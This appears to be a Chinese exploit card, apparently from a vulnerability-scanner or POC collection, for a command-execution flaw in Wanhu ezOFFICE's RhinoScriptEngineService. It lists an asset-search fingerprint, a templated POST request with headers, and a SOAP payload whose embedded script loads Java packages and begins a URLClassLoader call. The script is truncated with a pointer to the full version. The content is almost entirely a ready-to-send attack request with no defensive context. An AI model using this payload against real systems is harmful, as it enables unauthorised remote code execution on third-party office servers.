# 万户OAezOffice-RhinoScriptEngineService存在命令执行漏洞

- **系统**：万户　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="万户网络-ezOFFICE"`
- **请求**：`POST //defaultroot/services/./././RhinoScriptEngineService HTTP/1.1`
- **关键头**：`Host: {{Hostname}}`　`Content-Type: text/xml; charset=utf-8`　`SOAPAction: ""`

**请求体 / payload**
```
<?xml version='1.0' encoding='UTF-8'?>
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
<soapenv:Body>
<eval xmlns="http://127.0.0.1:8080/services/scriptEngine">
<arg0 xmlns="">
<![CDATA[
try {
load("nashorn:Moziilla_compat.js");
} catch (e) {
importPackage(Packages.java.io);
importPackage(Packages.java.lang);
importPackage(Packages.java.util);
importPackage(Packages.java.net);
new URLClassLoader([new File('../server').toURL…（脚本共 851 字，完整版见原文）
```